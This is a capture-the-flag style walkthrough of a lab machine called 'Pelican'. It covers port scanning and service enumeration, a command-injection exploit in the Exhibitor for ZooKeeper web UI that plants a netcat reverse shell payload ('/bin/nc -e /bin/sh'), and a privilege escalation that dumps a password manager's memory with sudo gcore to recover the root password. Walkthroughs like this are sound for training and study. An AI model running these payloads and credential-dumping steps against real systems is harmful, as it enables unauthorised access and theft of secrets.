																							                     Pelican Walkthrough
																										
Attacker's Machine: 192.168.49.68
Victim's Machine: 192.168.221.98
export IP=192.168.221.98
	
nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s

22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
631/tcp   open  ipp
2181/tcp  open  eforward
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
8081/tcp  open  blackice-icecap
41665/tcp open  unknown

nmap -Pn -n -sC -sV -p22,139,445,631,2181,2222,8080,8081,41665 $IP --open --stats-every=5s -oN results.txt

22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.221.98:8080/exhibitor/v1/ui/index.html
41665/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux;

nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
5353/udp  open   zeroconf

Vulnerability Assessment

nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 


nikto --url $IP -p 80

Port 139,445 - Samba
enum4linux -a $IP

print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (Samba 4.9.5-Debian)

Ports 631 - CUPS 2.2

# Maybe we can use this exploit after after we get shell to escalate to root
searchsploit cups
CUPS < 1.3.8-4 - Local Privilege Escalation                                                                                                                | multiple/local/7550.c

Ports 2181 - Zookeeper 3.4.6

No public exploits

Port 8080 - Jetty 1.0
Enumeration
gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/find_me.txt -t 40
/application.wadl

Port 8081 - nginx 1.14.2
Exhibitor for ZooKeeper   v1.0
# While going though the application, in the Config Tab, I've noticed an interesting feature called java.env script which appear to run a java script.
   Searched online for some public exploit and found https://www.exploit-db.com/exploits/48654
  Things look good and my initial though we're correct. So, let's check out the exploit.
  
  The steps to exploit it from a web browser:

    Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON

    In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:

    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
    Click Commit > All At Once > OK
    The command may take up to a minute to execute.
    
    
      In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:

    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
    Click Commit > All At Once > OK
    The command may take up to a minute to execute.
    
    
# So let's try out the exploit by using $(/bin/nc -e /bin/sh 192.168.45,5 4444 &)

nc -lvnp 4444                                           # Got Shell

cd /home/charles
cat local.txt                                              # Flag: 5fc6fff047fdfe33c9d534a2570814de


Privilege escalation

find / -perm -u=s -type f 2>/dev/null

/usr/sbin/pppd
/usr/bin/ntfs-3g
/usr/bin/bwrap
/usr/bin/password-store

cat /etc/crontab
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot         root    /usr/bin/password-store
@reboot         root    while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


Vulnerable to CVE-2021-4034

sudo -l

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
Sudoers file: /etc/sudoers.d/charles is readable
charles ALL=(ALL) NOPASSWD:/usr/bin/gcore

# Since we know that gcore can be used to dump process memory to a core file by specifying its PID. Let' check for some interesting processes we're we might discover something interesting.

ps auxwww
root     24690  0.0  0.0   2276  1188 ?        Ss   20:19   0:00 /usr/bin/password-store
root     24718  0.0  0.0   2276    72 ?        Ss   20:20   0:00 /usr/bin/password-store

# Remember that we had the SUID set on password-store as well. This is a password manager, which is pretty sensitive. Let's try to dump from this process.

sudo /usr/bin/gcore 24690

# Now let's read the dump using Strings command.

001 Password: root:
ClogKingpinInning731

su root
password ClogKingpinInning731
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt                                  # Flag: 5494ae1f194abd4e634b918ed9a0a1df
